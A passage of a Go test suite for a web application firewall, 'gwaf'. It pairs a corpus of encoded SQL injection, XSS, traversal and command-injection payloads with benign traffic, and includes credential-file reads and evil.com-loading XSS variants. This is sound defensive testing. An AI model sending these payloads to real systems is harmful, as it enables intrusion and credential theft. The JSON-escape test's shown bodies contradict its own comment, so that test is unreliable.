// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package gwaf_test

// The evasion corpus.
//
// Every payload here is a technique that has been used against real firewalls.
// The point is not that gwaf blocks obvious attacks — the point is that it
// blocks the *encoded* forms of them, because a matcher that only sees literal
// bytes is defeated by an attacker who spends ten seconds URL-encoding.
//
// The corpus is paired with an equally large benign corpus, and both are
// reported together. A detector that catches everything by blocking everything
// passes any recall-only suite, which is why detection rate on its own is never
// a passing metric here (CLAUDE.md §4).
//
// Provenance for the interpretation classes:
//
//   - UTF-7: CVE-2026-21876 (CVSS 9.3, Jan 2026) broke CRS across ModSecurity
//     v2, v3, and Coraza with exactly this.
//   - Double encoding, overlong UTF-8, NUL truncation, backslash separators:
//     long-standing techniques, all still effective against single-decoding
//     firewalls.

import (
	"fmt"
	"strings"
	"testing"

	"github.com/gsoultan/gwaf"
)

// evasion is one attack payload with the technique it uses.
type evasion struct {
	name      string
	technique string
	arg       string // sent as a query argument
	target    string // sent as the request target instead, when set
	header    [2]string
	body      string
}

// ---- the corpus ------------------------------------------------------------

var evasions = []evasion{
	// ---- baseline: unencoded, must obviously be caught ----------------------
	{name: "sqli/plain union", technique: "none", arg: "1 UNION SELECT password FROM users"},
	{name: "sqli/plain tautology", technique: "none", arg: "1' OR 1=1--"},
	{name: "xss/plain script", technique: "none", arg: "<script>alert(1)</script>"},
	{name: "traversal/plain", technique: "none", target: "/f?p=../../etc/passwd"},
	{name: "rce/plain", technique: "none", arg: "x; cat /etc/passwd"},

	// ---- case variation ----------------------------------------------------
	{name: "sqli/upper", technique: "case", arg: "1 union select password from users"},
	{name: "sqli/mixed", technique: "case", arg: "1 UnIoN SeLeCt password FROM users"},
	{name: "xss/upper tag", technique: "case", arg: "<SCRIPT>alert(1)</SCRIPT>"},
	{name: "xss/mixed tag", technique: "case", arg: "<ScRiPt>alert(1)</ScRiPt>"},

	// ---- whitespace splitting ----------------------------------------------
	{name: "sqli/extra spaces", technique: "whitespace", arg: "1 UNION     SELECT pw"},
	{name: "sqli/tab split", technique: "whitespace", arg: "1 UNION\tSELECT pw"},
	{name: "sqli/newline split", technique: "whitespace", arg: "1 UNION\nSELECT pw"},
	{name: "sqli/crlf split", technique: "whitespace", arg: "1 UNION\r\nSELECT pw"},
	{name: "sqli/vertical tab", technique: "whitespace", arg: "1 UNION\vSELECT pw"},
	{name: "sqli/formfeed", technique: "whitespace", arg: "1 UNION\fSELECT pw"},
	{name: "sqli/spaced tautology", technique: "whitespace", arg: "1'  OR  1 = 1 --"},

	// ---- single percent-encoding -------------------------------------------
	{name: "sqli/encoded union", technique: "urlencode",
		arg: "1 %55%4e%49%4f%4e %53%45%4c%45%43%54 pw"},
	{name: "sqli/encoded space", technique: "urlencode", arg: "1%20UNION%20SELECT%20pw"},
	{name: "xss/encoded tag", technique: "urlencode", arg: "%3Cscript%3Ealert(1)%3C/script%3E"},
	{name: "xss/encoded uppercase hex", technique: "urlencode", arg: "%3CSCRIPT%3Ealert(1)"},
	{name: "traversal/encoded slash", technique: "urlencode", target: "/f?p=..%2f..%2fetc%2fpasswd"},
	{name: "traversal/encoded dots", technique: "urlencode", target: "/f?p=%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
	{name: "rce/encoded semicolon", technique: "urlencode", arg: "x%3B%20cat%20%2Fetc%2Fpasswd"},
	{name: "lfi/encoded passwd", technique: "urlencode", arg: "%2Fetc%2Fpasswd"},

	// ---- plus-as-space (form encoding) -------------------------------------
	{name: "sqli/plus space", technique: "plus", arg: "1+UNION+SELECT+pw"},
	{name: "xss/plus space", technique: "plus", arg: "%3Cscript%3Ealert+(1)"},

	// ---- double encoding ---------------------------------------------------
	// The proxy decodes once, the origin decodes again; a single-decoding
	// firewall sees neither the encoded nor the final form.
	{name: "traversal/double encoded", technique: "double-encode",
		target: "/f?p=%252e%252e%252f%252e%252e%252fetc%252fpasswd"},
	{name: "traversal/double encoded slash", technique: "double-encode",
		target: "/f?p=..%252f..%252fetc%252fpasswd"},
	{name: "xss/double encoded tag", technique: "double-encode",
		arg: "%253Cscript%253Ealert(1)"},
	{name: "lfi/double encoded passwd", technique: "double-encode",
		arg: "%252Fetc%252Fpasswd"},
	{name: "sqli/double encoded quote", technique: "double-encode",
		arg: "1%2527 OR 1=1--"},

	// ---- overlong UTF-8 ----------------------------------------------------
	// Illegal encodings that permissive decoders still resolve to ASCII. This
	// is the family behind the historic IIS Unicode traversal bugs.
	{name: "traversal/overlong dot 2byte", technique: "overlong-utf8",
		target: "/f?p=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"},
	{name: "traversal/overlong slash", technique: "overlong-utf8",
		target: "/f?p=..%c0%af..%c0%afetc%c0%afpasswd"},
	{name: "traversal/overlong 3byte", technique: "overlong-utf8",
		target: "/f?p=%e0%80%ae%e0%80%ae/etc/passwd"},
	{name: "xss/overlong lt", technique: "overlong-utf8",
		arg: "%c0%bcscript%c0%bealert(1)"},

	// ---- NUL truncation ----------------------------------------------------
	// The origin's C-backed handler stops at the NUL; the firewall inspected
	// the whole string and saw a harmless suffix.
	{name: "lfi/null truncated", technique: "null-truncate",
		arg: "/etc/passwd%00.jpg"},
	{name: "lfi/null truncated png", technique: "null-truncate",
		arg: "/etc/passwd%00.png"},
	{name: "traversal/null truncated", technique: "null-truncate",
		target: "/f?p=../../etc/passwd%00.html"},
	{name: "xss/null truncated", technique: "null-truncate",
		arg: "<script>alert(1)</script>%00.txt"},

	// ---- backslash separators ----------------------------------------------
	// Windows, .NET, and several Java stacks accept these as path separators.
	{name: "traversal/backslash", technique: "separator",
		target: `/f?p=..\..\windows\system32`},
	{name: "traversal/encoded backslash", technique: "separator",
		target: "/f?p=..%5c..%5cwindows%5csystem32"},
	{name: "traversal/mixed separators", technique: "separator",
		target: `/f?p=..\../etc/passwd`},

	// ---- UTF-7 (CVE-2026-21876) --------------------------------------------
	// Inert bytes to a matcher; "<script>" to anything that decodes UTF-7.
	{name: "xss/utf7 script tag", technique: "utf7",
		arg: "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"},
	{name: "xss/utf7 lt only", technique: "utf7",
		arg: "+ADw-script+AD4-"},
	{name: "xss/utf7 img onerror", technique: "utf7",
		arg: "+ADw-img src=x onerror=alert(1)+AD4-"},

	// ---- HTML entities -----------------------------------------------------
	{name: "xss/entity named", technique: "html-entity",
		arg: "&lt;script&gt;alert(1)&lt;/script&gt;"},
	{name: "xss/entity decimal", technique: "html-entity",
		arg: "&#60;script&#62;alert(1)"},
	{name: "xss/entity hex", technique: "html-entity",
		arg: "&#x3c;script&#x3e;alert(1)"},
	{name: "xss/entity no semicolon", technique: "html-entity",
		arg: "&#60script&#62alert(1)"},

	// ---- combined techniques -----------------------------------------------
	// Layering is what real payloads do.
	{name: "sqli/encoded + case + whitespace", technique: "combined",
		arg: "1%20%55nIoN%09%53eLeCt%20pw"},
	{name: "traversal/double encoded + backslash", technique: "combined",
		target: "/f?p=..%255c..%255cwindows%255csystem32"},
	{name: "xss/entity + case", technique: "combined",
		arg: "&#60;ScRiPt&#62;alert(1)"},
	{name: "lfi/overlong + null", technique: "combined",
		arg: "%c0%ae%c0%ae/etc/passwd%00.jpg"},
	{name: "traversal/encoded + null + backslash", technique: "combined",
		target: `/f?p=..%5c..%5cetc%5cpasswd%00.txt`},

	// ---- header-borne payloads ---------------------------------------------
	// Injection through headers is routine; a firewall inspecting only
	// arguments misses it entirely.
	{name: "sqli/in referer", technique: "header",
		header: [2]string{"Referer", "http://x/?id=1 UNION SELECT pw"}},
	{name: "xss/in x-forwarded-for", technique: "header",
		header: [2]string{"X-Forwarded-For", "<script>alert(1)</script>"}},
	{name: "sqli/encoded in cookie header", technique: "header",
		header: [2]string{"Cookie", "sid=1%20UNION%20SELECT%20pw"}},
	{name: "scanner/sqlmap ua", technique: "header",
		header: [2]string{"User-Agent", "sqlmap/1.7.2#stable (http://sqlmap.org)"}},
	{name: "scanner/nikto ua", technique: "header",
		header: [2]string{"User-Agent", "Mozilla/5.00 (Nikto/2.1.6)"}},
	{name: "scanner/mixed case ua", technique: "header",
		header: [2]string{"User-Agent", "SQLMap/1.7"}},

	// ---- body-borne payloads -----------------------------------------------
	{name: "sqli/json body", technique: "body",
		body: `{"query":"1 UNION SELECT password FROM users"}`},
	{name: "xss/json body", technique: "body",
		body: `{"comment":"<script>alert(1)</script>"}`},
	{name: "sqli/form body", technique: "body",
		body: "id=1+UNION+SELECT+pw&submit=go"},
	{name: "xss/encoded in body", technique: "body",
		body: "c=%3Cscript%3Ealert(1)%3C/script%3E"},
	{name: "sqli/double encoded body", technique: "body",
		body: "id=1%2527%20OR%201%3D1--"},

	// ---- PHP and shell wrappers --------------------------------------------
	{name: "lfi/php filter", technique: "wrapper",
		arg: "php://filter/read=convert.base64-encode/resource=index.php"},
	{name: "lfi/php input", technique: "wrapper", arg: "php://input"},
	{name: "lfi/expect", technique: "wrapper", arg: "expect://ls"},
	{name: "lfi/encoded php filter", technique: "wrapper",
		arg: "php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode"},
	{name: "rce/bin sh", technique: "wrapper", arg: "/bin/sh -c id"},
	{name: "rce/encoded bin sh", technique: "wrapper", arg: "%2Fbin%2Fsh%20-c%20id"},

	// ---- sensitive file access ---------------------------------------------
	{name: "lfi/ssh key", technique: "sensitive", arg: "../../../home/user/.ssh/id_rsa"},
	{name: "lfi/aws creds", technique: "sensitive", arg: "../../.aws/credentials"},
	{name: "lfi/proc environ", technique: "sensitive", arg: "/proc/self/environ"},
	{name: "lfi/shadow", technique: "sensitive", arg: "/etc/shadow"},
	{name: "lfi/encoded ssh key", technique: "sensitive", arg: "..%2f..%2f.ssh%2fid_rsa"},
}

// ---- the benign corpus -----------------------------------------------------
//
// Traffic that must not be blocked. It deliberately includes input that looks
// like an attack to a naive matcher: prose containing SQL keywords, legitimate
// encoding, file names with dots, base64, and markup a user typed on purpose.

type benignCase struct {
	name   string
	arg    string
	target string
	header [2]string
	body   string
}

var benignTraffic = []benignCase{
	// ---- ordinary requests -------------------------------------------------
	{name: "root", target: "/"},
	{name: "rest path", target: "/api/v1/orders/12345"},
	{name: "nested rest", target: "/api/v2/users/42/orders/99/items"},
	{name: "static asset", target: "/assets/app.min.v2.js"},
	{name: "versioned asset", target: "/static/vendor-1.2.3.bundle.css"},
	{name: "trailing slash", target: "/docs/getting-started/"},
	{name: "health check", target: "/healthz"},

	// ---- search and prose --------------------------------------------------
	{name: "plain search", arg: "golang web application framework"},
	{name: "search with apostrophe", arg: "it's a great product"},
	{name: "possessive", arg: "the user's account settings"},
	{name: "sql word: select", arg: "please select a delivery option"},
	{name: "sql word: union", arg: "credit union membership application"},
	{name: "sql word: drop", arg: "drop off location near me"},
	{name: "sql word: insert", arg: "insert the card and wait"},
	{name: "sql word: update", arg: "update my mailing address"},
	{name: "sql word: delete", arg: "delete my account permanently"},
	{name: "sql phrase in prose", arg: "we should select a new union representative"},
	{name: "or in prose", arg: "coffee or tea, either is fine"},
	{name: "equals in prose", arg: "the total = 42 dollars"},
	{name: "script word in prose", arg: "the shooting script was rewritten"},
	{name: "quoted phrase", arg: `he said "that's the one" and left`},
	{name: "math expression", arg: "1 + 1 = 2"},
	{name: "comparison", arg: "price < 100 and rating > 4"},

	// ---- legitimate encoding -----------------------------------------------
	{name: "encoded space", arg: "hello%20world"},
	{name: "encoded email", arg: "user%40example.com"},
	{name: "encoded ampersand", arg: "research%20%26%20development"},
	{name: "plus as space", arg: "hello+world+again"},
	{name: "encoded query in redirect", arg: "/dashboard%3Ftab%3Dsettings"},
	{name: "percent in text", arg: "50% off today"},
	{name: "percent sign encoded", arg: "50%25 off today"},

	// ---- identifiers and tokens --------------------------------------------
	{name: "uuid", arg: "550e8400-e29b-41d4-a716-446655440000"},
	{name: "iso timestamp", arg: "2026-08-05T07:38:00Z"},
	{name: "jwt-like token", arg: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc-_123"},
	{name: "base64 payload", arg: "SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0Lg=="},
	{name: "hex hash", arg: "d41d8cd98f00b204e9800998ecf8427e"},
	{name: "semver", arg: "1.2.3-beta.4+build.567"},
	{name: "content hash path", target: "/static/app.a1b2c3d4e5f6.js"},

	// ---- relative links (contain dots, must not trip traversal) ------------
	{name: "relative link", arg: "/dashboard/settings"},
	{name: "filename with dots", arg: "report.2026.final.pdf"},
	{name: "dotfile name", arg: ".gitignore"},
	{name: "double extension", arg: "archive.tar.gz"},
	{name: "path with single dot", target: "/api/./v1/status"},

	// ---- markup a user typed on purpose ------------------------------------
	{name: "html in comment body", body: `{"comment":"use the <b>bold</b> tag"}`},
	{name: "code sample in body", body: `{"snippet":"if (a < b) { return; }"}`},
	{name: "markdown body", body: `{"md":"# Title\n\nSome *emphasis* and a [link](/x)."}`},
	{name: "entity in prose", body: `{"c":"AT&T and Johnson &amp; Johnson"}`},
	{name: "ampersand in name", arg: "Smith & Sons Ltd"},

	// ---- realistic API bodies ----------------------------------------------
	{name: "json order", body: `{"name":"Alice","qty":3,"note":"deliver before 5pm"}`},
	{name: "json nested", body: `{"user":{"id":1,"prefs":{"theme":"dark","lang":"en"}}}`},
	{name: "json array", body: `{"ids":[1,2,3,4,5],"action":"archive"}`},
	{name: "form body", body: "email=user%40example.com&subject=Hello+there&msg=Thanks"},
	{name: "json with url", body: `{"callback":"https://example.com/hook?id=42&t=1"}`},
	{name: "json with unicode", body: `{"name":"José García","city":"München"}`},

	// ---- ordinary headers ---------------------------------------------------
	{name: "chrome ua", header: [2]string{"User-Agent",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}},
	{name: "safari ua", header: [2]string{"User-Agent",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"}},
	{name: "curl ua", header: [2]string{"User-Agent", "curl/8.4.0"}},
	{name: "go client ua", header: [2]string{"User-Agent", "Go-http-client/2.0"}},
	{name: "googlebot ua", header: [2]string{"User-Agent",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}},
	{name: "accept header", header: [2]string{"Accept",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8"}},
	{name: "accept language", header: [2]string{"Accept-Language", "en-GB,en;q=0.9,fr;q=0.8"}},
	{name: "referer", header: [2]string{"Referer", "https://example.com/search?q=widgets"}},
	{name: "auth bearer", header: [2]string{"Authorization",
		"Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.sig"}},
	{name: "content type json", header: [2]string{"Content-Type", "application/json; charset=utf-8"}},
	{name: "content type multipart", header: [2]string{"Content-Type",
		"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"}},
	{name: "cache control", header: [2]string{"Cache-Control", "max-age=0, must-revalidate"}},
	{name: "traceparent", header: [2]string{"Traceparent",
		"00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01"}},

	// ---- unicode and international ----------------------------------------
	{name: "accented text", arg: "café résumé naïve"},
	{name: "cjk text", arg: "日本語のテキスト"},
	{name: "cyrillic text", arg: "Привет мир"},
	{name: "emoji", arg: "great product 👍🎉"},
	{name: "rtl text", arg: "مرحبا بالعالم"},
	{name: "encoded utf8", arg: "caf%C3%A9%20r%C3%A9sum%C3%A9"},
}

// ---- the tests -------------------------------------------------------------

func runEvasion(t *testing.T, w *gwaf.WAF, e evasion) gwaf.Decision {
	t.Helper()

	tx := w.NewTransaction()
	defer tx.Close()

	target := e.target
	if target == "" {
		target = "/search"
	}
	method := "GET"
	if e.body != "" {
		method = "POST"
	}

	tx.SetRequestLine(method, target, "HTTP/1.1")
	tx.SetRemoteAddr("192.0.2.1")
	if e.header[0] != "" {
		tx.AddRequestHeader(e.header[0], e.header[1])
	}
	if e.arg != "" {
		tx.AddArgument("q", e.arg)
	}
	// A traversal payload in the target is also exposed as an argument, the way
	// a query-string parser would.
	if e.target != "" {
		if i := strings.IndexByte(e.target, '='); i >= 0 {
			tx.AddArgument("p", e.target[i+1:])
		}
	}

	if d := tx.ProcessRequestHeaders(); d.Blocked() {
		return d
	}
	if e.body != "" {
		tx.SetRequestBody([]byte(e.body))
	}
	return tx.ProcessRequestBody()
}

func runBenign(t *testing.T, w *gwaf.WAF, b benignCase) gwaf.Decision {
	t.Helper()

	tx := w.NewTransaction()
	defer tx.Close()

	target := b.target
	if target == "" {
		target = "/search"
	}
	method := "GET"
	if b.body != "" {
		method = "POST"
	}

	tx.SetRequestLine(method, target, "HTTP/1.1")
	tx.SetRemoteAddr("192.0.2.1")
	if b.header[0] != "" {
		tx.AddRequestHeader(b.header[0], b.header[1])
	}
	if b.arg != "" {
		tx.AddArgument("q", b.arg)
	}

	if d := tx.ProcessRequestHeaders(); d.Blocked() {
		return d
	}
	if b.body != "" {
		tx.SetRequestBody([]byte(b.body))
	}
	return tx.ProcessRequestBody()
}

// TestEvasionCorpus reports the detection rate per technique. It is the primary
// security metric, and it is reported alongside the false-positive rate from
// TestBenignCorpus because neither number means anything alone.
func TestEvasionCorpus(t *testing.T) {
	w := newWAF(t)

	byTechnique := map[string]struct{ caught, total int }{}
	var missed []string

	for _, e := range evasions {
		t.Run(e.name, func(t *testing.T) {
			d := runEvasion(t, w, e)

			s := byTechnique[e.technique]
			s.total++
			if d.Blocked() {
				s.caught++
			} else {
				missed = append(missed, fmt.Sprintf("%s (%s)", e.name, e.technique))
				t.Errorf("NOT BLOCKED: technique=%s\n  arg=%q target=%q header=%v body=%q\n"+
					"  score=%d reason=%v", e.technique, e.arg, e.target, e.header, e.body,
					d.Score(), d.Reason())
			}
			byTechnique[e.technique] = s
		})
	}

	caught, total := 0, 0
	for _, s := range byTechnique {
		caught += s.caught
		total += s.total
	}
	t.Logf("detection: %d/%d (%.1f%%)", caught, total, 100*float64(caught)/float64(total))
	for tech, s := range byTechnique {
		t.Logf("  %-16s %d/%d", tech, s.caught, s.total)
	}
	if len(missed) > 0 {
		t.Logf("missed: %v", missed)
	}
}

// TestBenignCorpus is weighted equally with the evasion corpus. A rule that
// blocks legitimate traffic gets the whole firewall switched off, which is a
// worse outcome than the attack it was meant to stop.
func TestBenignCorpus(t *testing.T) {
	w := newWAF(t)

	falsePositives := 0
	for _, b := range benignTraffic {
		t.Run(b.name, func(t *testing.T) {
			d := runBenign(t, w, b)
			if d.Blocked() {
				falsePositives++
				t.Errorf("FALSE POSITIVE: rule=%d msg=%q interpretation=%s\n"+
					"  arg=%q target=%q header=%v body=%q",
					d.RuleID(), d.Message(), d.Interpretation(),
					b.arg, b.target, b.header, b.body)
			}
		})
	}

	rate := 100 * float64(falsePositives) / float64(len(benignTraffic))
	t.Logf("false positives: %d/%d (%.2f%%)", falsePositives, len(benignTraffic), rate)
}

// TestInterpretationIsReported checks that a payload caught only under an
// alternative decoding says so. Without it an operator investigating the block
// sees inert bytes in the log and concludes the firewall malfunctioned.
func TestInterpretationIsReported(t *testing.T) {
	w := newWAF(t)

	// Only payloads that are genuinely invisible in the bytes on the wire
	// belong here. A payload the verbatim reading already catches is reported
	// as "none", and that is the better outcome — it means no alternative
	// interpretation was needed to see it.
	tests := []struct {
		name string
		arg  string
		want string
	}{
		{"utf7", "+ADw-script+AD4-alert(1)", "utf7"},
		{"double encoded", "%253Cscript%253Ealert(1)", "double_encoded"},
		{"html entity named", "&lt;script&gt;alert(1)", "html_entity"},
		{"html entity decimal", "&#60;script&#62;alert(1)", "html_entity"},
		{"html entity hex", "&#x3c;script&#x3e;alert(1)", "html_entity"},
		{"double encoded traversal", "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "double_encoded"},
		// %c0%bc is the overlong form of '<'; %c0%ae is '.', which is the
		// traversal variant rather than the tag one.
		{"overlong utf8", "%c0%bcscript%c0%bealert(1)", "overlong_utf8"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := runEvasion(t, w, evasion{arg: tt.arg})
			if !d.Blocked() {
				t.Fatalf("not blocked: %q", tt.arg)
			}
			if got := d.Interpretation(); !strings.Contains(got, tt.want) {
				t.Errorf("Interpretation() = %q, want it to mention %q", got, tt.want)
			}
		})
	}
}

// TestVerbatimMatchReportsNoInterpretation is the other half: a payload visible
// as sent must not claim an alternative decoding found it, or the audit record
// would misdirect whoever investigates.
func TestVerbatimMatchReportsNoInterpretation(t *testing.T) {
	w := newWAF(t)

	// A NUL-truncation payload is a superstring of the attack, so the verbatim
	// reading sees it. ClassNullTruncate exists for allowlist rules, where
	// truncation lets an origin act on a prefix that passed a suffix check —
	// not for signature rules, which match the payload either way.
	for _, arg := range []string{
		"1 UNION SELECT pw",
		"<script>alert(1)</script>",
		"/etc/passwd%00.jpg",
	} {
		t.Run(arg, func(t *testing.T) {
			d := runEvasion(t, w, evasion{arg: arg})
			if !d.Blocked() {
				t.Fatalf("not blocked: %q", arg)
			}
			if got := d.Interpretation(); got != "none" {
				t.Errorf("Interpretation() = %q, want \"none\" for a payload "+
					"visible in the bytes as sent", got)
			}
		})
	}
}

// TestBenignTrafficBoundsRuleEvaluation guards the security features against
// the performance thesis.
//
// The bound is a small constant rather than zero. The structural SQL detector
// declares broad literals — a quote, an equals sign — because payloads are
// built from them, so prose containing those characters is legitimately a
// prefilter candidate. What must stay true is that the count does not grow
// with the ruleset, and that every rule which runs rejects.
func TestBenignTrafficBoundsRuleEvaluation(t *testing.T) {
	w := newWAF(t)

	// Well above what any single benign value should trigger, and far below
	// the 26-rule ruleset — so a prefilter regression still fails this.
	const maxEvaluated = 4

	for _, b := range benignTraffic {
		t.Run(b.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			target := b.target
			if target == "" {
				target = "/search"
			}
			method := "GET"
			if b.body != "" {
				method = "POST"
			}
			tx.SetRequestLine(method, target, "HTTP/1.1")
			if b.header[0] != "" {
				tx.AddRequestHeader(b.header[0], b.header[1])
			}
			if b.arg != "" {
				tx.AddArgument("q", b.arg)
			}
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Fatalf("false positive at header phase: rule=%d", d.RuleID())
			}
			if b.body != "" {
				tx.SetRequestBody([]byte(b.body))
			}
			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Fatalf("false positive at body phase: rule=%d", d.RuleID())
			}

			if got := tx.RulesEvaluated(); got > maxEvaluated {
				t.Errorf("RulesEvaluated() = %d, want <= %d", got, maxEvaluated)
			}
		})
	}
}

// TestEvasionCorpusUnderDetectionOnly verifies that detection-only mode still
// detects. A rollout mode that quietly stops finding things is worse than no
// mode at all.
func TestEvasionCorpusUnderDetectionOnly(t *testing.T) {
	w := newWAF(t, gwaf.WithMode(gwaf.DetectionOnly))

	detected := 0
	for _, e := range evasions {
		d := runEvasion(t, w, e)
		if d.Blocked() {
			t.Errorf("%s: detection-only mode blocked", e.name)
		}
		if d.RuleID() != 0 || d.Score() > 0 {
			detected++
		}
	}

	if detected == 0 {
		t.Fatal("detection-only mode detected nothing at all")
	}
	t.Logf("detected %d/%d in detection-only mode", detected, len(evasions))
}

// TestSemanticDetectionCoversUnlistedVariants is the argument for structural
// detection, stated as a test.
//
// None of these payloads appear in the evasion corpus and no literal in the core
// ruleset matches them. A signature engine would need a separate rule for each,
// and would still be one variant behind. The structural detector covers the
// family because it reads grammar rather than bytes.
func TestSemanticDetectionCoversUnlistedVariants(t *testing.T) {
	w := newWAF(t)

	variants := []struct{ name, payload string }{
		{"versioned comment", "1'/*!50000OR*/1=1--"},
		{"comment split OR", "1'/**/OR/**/1=1--"},
		{"union split by comments", "1/**/UNION/**/ALL/**/SELECT/**/pw"},
		{"pipe operator", "1' || '1'='1"},
		{"xor connector", "1' XOR 1=1--"},
		{"greater-than tautology", "1' OR 2>1--"},
		{"not-equal tautology", "1' OR 1<>2--"},
		{"like tautology", "1' OR 'a' LIKE 'a'--"},
		{"null comparison", "1' OR NULL=NULL--"},
		{"backtick context", "1` OR 1=1--"},
		{"no whitespace", "1'OR'1'='1"},
		{"newline separated", "1' OR\n1=1--"},
		{"hash terminator", "1' OR 1=1#"},
		{"extractvalue exfil", "1' AND extractvalue(1,concat(0x7e,version()))--"},
		{"updatexml exfil", "1' AND updatexml(1,concat(0x7e,user()),1)--"},
		{"pg_sleep timing", "1'; SELECT pg_sleep(10)--"},
		{"waitfor timing", "1'; WAITFOR DELAY '0:0:5'--"},
		{"stacked truncate", "x'; TRUNCATE TABLE logs--"},
		{"stacked update", "1; UPDATE users SET admin=1"},
		{"union distinct", "1 UNION DISTINCT SELECT 1"},

		// XSS variants no literal in the ruleset matches.
		{"svg onload slash", "<svg/onload=alert(1)>"},
		{"tab in scheme", `<a href="java` + "\t" + `script:alert(1)">x</a>`},
		{"null in scheme", `<a href="java` + "\x00" + `script:alert(1)">x</a>`},
		{"attribute breakout", `x" onerror="alert(1)`},
		{"single quote breakout", `x' onfocus='alert(1)`},
		{"textarea escape", "</textarea><script>alert(1)</script>"},
		{"style expression", `<div style="width:expression(alert(1))">`},
		{"moz binding", `<div style="-moz-binding:url(//evil.com/x.xml)">`},
		{"details ontoggle", "<details open ontoggle=alert(1)>"},
		{"formaction", `<button formaction="javascript:alert(1)">x</button>`},
		{"base tag", `<base href="//evil.com/">`},
		{"svg animate onbegin", `<svg><animate onbegin=alert(1) attributeName=x>`},
		{"newline before handler", "<img src=x\nonerror=alert(1)>"},
	}

	for _, v := range variants {
		t.Run(v.name, func(t *testing.T) {
			d := runEvasion(t, w, evasion{arg: v.payload})
			if !d.Blocked() {
				t.Errorf("unlisted variant not blocked: %q (score=%d)",
					v.payload, d.Score())
			}
		})
	}
}

// TestProseWithSQLKeywordsStillPasses is the counterweight, and it covers the
// concrete false positive the literal rules had: "the union selected a leader"
// collapses to "unionselected" once whitespace is stripped, which contains
// "unionselect". The structural detector does not care, because the words are
// not adjacent in the grammar.
func TestProseWithSQLKeywordsStillPasses(t *testing.T) {
	w := newWAF(t)

	prose := []string{
		"the union selected a new representative",
		"our credit union selects officers annually",
		"please select a delivery option from the list",
		"drop off the table at the warehouse",
		"we order by phone and update the group weekly",
		"it's urgent, don't delete my account",
		"the total = 42 dollars, price < 100 or rating > 4",
		"see note -- it explains the change",
		"insert the card, then select your language",

		// Markup and web prose a user legitimately sends.
		"use the <b>bold</b> tag for emphasis",
		"<p>first paragraph</p><p>second</p>",
		`<a href="/docs/getting-started">read the docs</a>`,
		`<img src="/static/logo.png" alt="company logo">`,
		"the onerror callback fires when an image fails to load",
		"a regular expression would be simpler here",
		"List<String> names = new ArrayList<>();",
		"const f = (a) => a < 10 && a > 0",
		"avoid eval in production javascript",
		"the iframe is sandboxed by default",
	}

	for _, p := range prose {
		t.Run(p, func(t *testing.T) {
			if d := runEvasion(t, w, evasion{arg: p}); d.Blocked() {
				t.Errorf("prose blocked: %q rule=%d msg=%q", p, d.RuleID(), d.Message())
			}
		})
	}
}

// TestJSONEscapedPayloadsAreDetected covers the correctness half of body
// parsing.
//
// `{"c":"<script>"}` contains no angle bracket anywhere on the wire.
// A firewall reading raw bytes sees inert text; the origin's JSON parser hands
// the application `<script>`. This is the same disagreement class as the
// encoding ambiguities in internal/interpret, arriving through a different
// door — the escape is not a reading to guess at, it is a decoding the origin
// will certainly perform.
func TestJSONEscapedPayloadsAreDetected(t *testing.T) {
	w := newWAF(t)

	payloads := []struct{ name, body string }{
		{"unicode escaped script", `{"c":"<script>alert(1)</script>"}`},
		{"unicode escaped img", `{"c":"<img src=x onerror=alert(1)>"}`},
		{"partially escaped", `{"c":"<img src=x onerror=alert(1)>"}`},
		{"escaped quote sqli", `{"q":"1' OR 1=1--"}`},
		{"escaped in key", `{"<script>":"x"}`},
		{"escaped in array", `{"items":["<script>alert(1)</script>"]}`},
		{"escaped nested", `{"a":{"b":{"c":"<script>x</script>"}}}`},
		{"sqli union in field", `{"query":"1 UNION SELECT password FROM users"}`},
		{"sqli tautology in field", `{"id":"1' OR 1=1--"}`},
	}

	for _, p := range payloads {
		t.Run(p.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				return
			}
			tx.SetRequestBody([]byte(p.body))

			if d := tx.ProcessRequestBody(); !d.Blocked() {
				t.Errorf("escaped payload not detected: %s", p.body)
			}
		})
	}
}

// TestJSONBodyFieldsAreInspectedIndividually verifies the structural half: a
// parsed body reports the field a payload was found in, not merely "the body".
func TestJSONBodyFieldsAreInspectedIndividually(t *testing.T) {
	w := newWAF(t)

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte(`{"user":{"name":"Alice"},"note":"<script>alert(1)</script>"}`))

	d := tx.ProcessRequestBody()
	if !d.Blocked() {
		t.Fatal("payload in a body field not detected")
	}
	if d.Key() != "note" {
		t.Errorf("Key() = %q, want %q — the decision should name the field",
			d.Key(), "note")
	}
}

// TestBenignJSONBodiesPass is the counterweight for body parsing.
func TestBenignJSONBodiesPass(t *testing.T) {
	w := newWAF(t)

	bodies := []string{
		`{"name":"Alice","qty":3,"note":"please deliver before 5pm"}`,
		`{"user":{"id":1,"prefs":{"theme":"dark","lang":"en"}}}`,
		`{"ids":[1,2,3,4,5],"action":"archive"}`,
